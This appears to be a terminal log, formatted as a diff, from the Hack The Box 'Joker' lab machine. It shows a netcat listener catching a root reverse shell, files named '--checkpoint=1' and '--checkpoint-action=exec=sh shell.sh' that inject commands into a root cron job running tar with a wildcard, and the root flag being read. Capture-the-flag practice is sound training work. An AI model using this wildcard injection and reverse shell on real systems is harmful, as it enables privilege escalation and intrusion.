@@ -1,0 +1,38 @@
+┌─[root@parrot]─[~/hackthebox/joker]       
+└──╼ #nc -u -nvlp 8082                     
+Ncat: Version 7.80 ( https://nmap.org/ncat )                                           
+Ncat: Listening on :::8082                 
+Ncat: Listening on 0.0.0.0:8082            
+
+Ncat: Connection from 10.10.10.21.         
+/bin/sh: 0: can't access tty; job control turned off                                   
+# # id                                     
+uid=0(root) gid=0(root) groups=0(root)     
+# ls                                       
+application.py                             
+--checkpoint=1                             
+--checkpoint-action=exec=sh shell.sh       
+data                                       
+__init__.py                                
+models.py                                  
+shell.sh                                   
+static                                     
+templates                                  
+utils.py                                   
+views.py                                   
+# cd /root                                 
+# ls                                       
+backup.sh                                  
+root.txt                                   
+# cat root.txt                             
+d452b7faf5fd5b30210f340ef1d4146e           
+# cat backup.sh                            
+#!/bin/sh                                  
+
+FILENAME="dev-$(date +%s).tar.gz"          
+
+cd /home/alekos/development;               
+tar cf /home/alekos/backup/$FILENAME *;    
+chown root:alekos /home/alekos/backup/$FILENAME;                                       
+chmod 640 /home/alekos/backup/$FILENAME;   
+# exit                                     
